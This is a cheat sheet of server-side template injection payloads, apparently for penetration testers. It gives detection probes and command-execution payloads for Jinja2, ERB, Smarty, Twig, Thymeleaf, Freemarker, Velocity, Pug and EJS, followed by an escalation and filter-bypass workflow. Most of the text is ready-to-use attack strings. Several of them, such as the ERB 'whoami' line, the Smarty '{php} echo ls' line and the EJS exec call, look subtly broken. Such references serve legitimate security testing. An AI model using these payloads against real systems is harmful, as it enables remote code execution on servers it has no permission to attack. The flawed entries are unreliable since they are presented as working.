Server-Side Template Injection (SSTI) vulnerabilities occur when user input is embedded into templates and evaluated by a server. Exploiting SSTI vulnerabilities allows attackers to execute arbitrary code on the server. Here's a list of useful SSTI cheat sheets, categorized by popular templating engines.

here is some of server-side based Template Engine:
	"Jinja2 or Jinja, Freemaker, Mako, Velocity, Smarty, Tornado, Genshi, Twig, Mustache, etc."

Here are some cheat sheet payloads for different languages and Template Engines:
 General SSTI Detection

    Detection Payloads:
        Test for template engine:
            {{7*7}} for Jinja2/Django
            ${{7*7}} for Freemarker, Velocity, Thymeleaf
            <%= 7*7 %> for JSP
            #{7*7} for Ruby
        Result: 49 in the output indicates a possible SSTI.

Python (Jinja2, Django)

    Basic payloads:
        {{7*7}}
        {{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
        {{config.items()}}
    Remote Code Execution:
        {{ ''.__class__.__mro__[1].__subclasses__()[284]('id',shell=True,stdout=-1).communicate()[0].strip() }}

Ruby on Rails (ERB)

    Basic payloads:
        <%= 7*7 %>
        <%= whoami %>
    Remote Code Execution:
        <%= Kernel.exec("ls") %>

PHP (Smarty, Twig)

    Smarty:
        {php} echo ls; {/php}
        {system('ls')}
    Twig:
        {{7*7}}
        {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
        {{["id"]|filter("system")}}

Java (Thymeleaf, Freemarker, Velocity)

    Thymeleaf:
        ${{T(java.lang.Runtime).getRuntime().exec("id")}}
    Freemarker:
        ${"freemarker.template.utility.Execute"?new()("id")}
    Velocity:
        #set($str=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))

Node.js (Pug, EJS)

    Pug:
        #{7*7}
        - var exec = require('child_process').exec; exec('id', function(err, stdout) { console.log(stdout) })
    EJS:
        <%= exec('id') %>

Detection Payload Workflow

    Initial test: Try simple arithmetic (e.g., {{7*7}}) to confirm that the input is processed by a template engine.
    Escalation: Use code execution payloads based on the template engine identified.
    Filter Bypass: Try obfuscating payloads or chaining functions to bypass filters.

Tools:
    [Tplmap: Automated tool to exploit SSTI vulnerabilities.](https://github.com/epinna/tplmap)
